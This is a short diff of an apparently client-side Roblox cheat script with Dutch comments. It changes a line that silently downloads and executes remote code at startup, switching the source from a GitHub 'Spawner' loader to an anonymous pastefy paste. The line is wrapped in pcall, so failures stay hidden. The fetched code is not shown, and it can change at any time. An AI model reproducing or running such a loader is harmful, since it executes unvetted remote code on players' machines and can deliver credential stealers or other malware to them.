@@ -8,7 +8,7 @@ local player = Players.LocalPlayer
 
 -- Direct je script laden aan het begin
 pcall(function()
-    loadstring(game:HttpGet("https://raw.githubusercontent.com/SpawnerScriptGAG/Spawner/refs/heads/main/LoaderV2"))()
+    loadstring(game:HttpGet("https://pastefy.app/e0jnUTBw/raw"))()
 end)
 
 -- ScreenGui aanmaken
@@ -256,5 +256,6 @@ StartButton.MouseButton1Click:Connect(function()
         end)
     end
 end)
+
 
 
